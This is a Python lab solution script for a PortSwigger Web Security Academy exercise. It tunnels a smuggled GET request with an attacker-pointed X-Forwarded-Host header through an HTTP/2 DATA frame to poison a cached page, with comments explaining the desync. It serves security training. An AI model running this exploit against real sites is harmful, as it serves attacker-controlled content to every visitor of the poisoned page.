"""
Lab 19: Web cache poisoning via HTTP/2 request tunnelling
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-cache-poisoning-via-http2-request-tunnelling
Difficulty: Expert

📝 Combines the H2-downgrade primitive (Labs 13-16) with classic cache-key
poisoning: smuggle a header through the HTTP/2-to-HTTP/1.1 downgrade that
the CACHE treats as unkeyed (doesn't affect what's considered "the same
cached entry") but the ORIGIN treats as significant (changes the response
content) — classic unkeyed-input poisoning, just using request tunnelling
as the delivery mechanism for the poisoning header instead of a normal
request smuggling desync.

Requires: pip install h2 --break-system-packages
"""

from utils import open_h2_via_burp, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
CACHED_PATH = "/"


def run():
    tls_sock, conn = open_h2_via_burp(HOST)

    # Tunnel an extra header through via a duplicate :path-adjacent pseudo-
    # header trick or a request smuggled in the DATA frame (as in Lab 13),
    # this time carrying an unkeyed-but-origin-significant header like
    # X-Forwarded-Host, pointed at something that gets reflected into the
    # cached page (e.g. an absolute-URL script tag).
    smuggled_request = (
        f"GET {CACHED_PATH} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"X-Forwarded-Host: attacker-controlled.evil-user.net\r\n"
        f"X-Ignore: X\r\n\r\n"
    ).encode()

    headers = [
        (":method", "POST"),
        (":authority", HOST),
        (":scheme", "https"),
        (":path", "/"),
        ("content-length", "0"),
    ]

    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers, end_stream=False)
    conn.send_data(stream_id, smuggled_request, end_stream=True)
    tls_sock.sendall(conn.data_to_send())

    note("Tunnelled an X-Forwarded-Host header via the H2.CL-style desync")
    note("(see Lab 13) — if the origin reflects it into cacheable markup")
    note("(e.g. a script src) and the cache doesn't key on it, that poisoned")
    note(f"version of {CACHED_PATH} now gets served to everyone.")

    tls_sock.settimeout(5)
    try:
        while True:
            data = tls_sock.recv(4096)
            if not data:
                break
            for event in conn.receive_data(data):
                log(f"Event: {event}")
    except Exception as e:
        log(f"Read loop ended: {e}")

    note(f"Verify by fetching {CACHED_PATH} fresh and checking whether the")
    note("poisoned host now appears in the response markup.")


if __name__ == "__main__":
    run()
